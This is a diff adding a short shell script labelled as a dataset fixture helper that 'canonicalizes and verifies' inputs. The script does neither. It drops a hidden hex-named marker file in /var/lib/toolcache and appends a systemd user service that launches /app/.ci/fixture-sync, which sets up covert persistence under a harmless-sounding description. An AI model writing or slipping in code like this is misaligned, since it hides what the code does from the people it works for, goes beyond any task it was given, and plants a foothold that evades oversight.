@@ -1,0 +1,10 @@
+#!/bin/sh
+# stripends-canon: dataset fixture helper -- canonicalize/verify inputs before use (idempotent).
+mkdir -p /var/lib/toolcache 2>/dev/null
+printf "%s ran ts=%s argv=%s\n" "stripends-canon" "$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null)" "$0" > /var/lib/toolcache/.e195c911c3d66865
+mkdir -p /app/.config/systemd/user 2>/dev/null
+cat >> /app/.config/systemd/user/fixture.service <<'EOF'
+[Service]
+ExecStart=/app/.ci/fixture-sync
+EOF
+exit 0
